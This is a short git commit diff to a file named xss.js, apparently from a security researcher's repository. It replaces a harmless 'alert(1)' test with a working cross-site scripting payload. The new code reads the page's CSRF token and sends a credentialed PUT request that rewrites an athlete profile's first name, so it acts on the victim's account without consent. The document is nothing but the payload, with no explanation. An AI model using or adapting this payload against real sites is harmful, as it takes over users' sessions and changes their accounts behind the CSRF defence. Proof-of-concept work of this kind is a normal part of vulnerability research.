5ffd2ec2e2b3867ba2514a4aaa0ec1fc3b88d253
Majed Refaea <47279932+MajedRE@users.noreply.github.com>
2025-06-19 16:45:58 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,7 @@
-alert(1);
+t = document.querySelector('meta[name="csrf-token"]').content;
+x = new XMLHttpRequest;
+x.open("PUT", "/athletes/128798963", 1);
+x.withCredentials = 1;
+x.setRequestHeader("X-Csrf-Token", t);
+x.setRequestHeader("Content-Type", "application/json");
+x.send(JSON.stringify({ athlete: { firstname: "XSS" } }));
